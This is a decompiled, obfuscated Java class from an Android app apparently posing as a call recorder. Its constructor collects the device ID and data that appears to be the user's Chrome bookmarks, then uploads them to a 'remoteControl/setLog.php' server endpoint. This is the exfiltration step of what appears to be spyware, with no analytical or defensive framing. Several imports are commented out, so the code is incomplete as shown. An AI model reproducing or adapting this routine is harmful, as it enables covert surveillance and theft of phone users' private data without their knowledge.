package com.yasoka.spcallrecord.recorder.call.a.c.a;

/*import a.c.j.c;
import a.c.e.e;*/
import android.content.Context;
//import com.app.activity.MyApp;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetListBookmarksChrome */
public class a {

    /* renamed from: a reason: collision with root package name */
    private int f1a;

    /* renamed from: b reason: collision with root package name */
    private int f2b;

    /* renamed from: c reason: collision with root package name */
    private String f3c;

    public a(int i, int i2, String str) {
        this.f1a = i;
        this.f2b = i2;
        this.f3c = str;
        String str2 = "";
        try {
            Context applicationContext = MyApp.b().getApplicationContext();
            String a2 = com.app.action.a.a(applicationContext, this.f1a, a.c.j.a.f296b);
            String b2 = c.b();
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append(str2);
            sb.append(e.e(applicationContext));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("dateConnexion", b2);
            hashMap.put("type", this.f3c);
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str2);
            sb2.append(this.f2b);
            hashMap.put("idLog", sb2.toString());
            hashMap.put("data", a2);
            long a3 = a.a.a(e.e(applicationContext), b2, this.f3c, this.f2b, a2, applicationContext);
            if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                a.a.d((int) a3, applicationContext);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
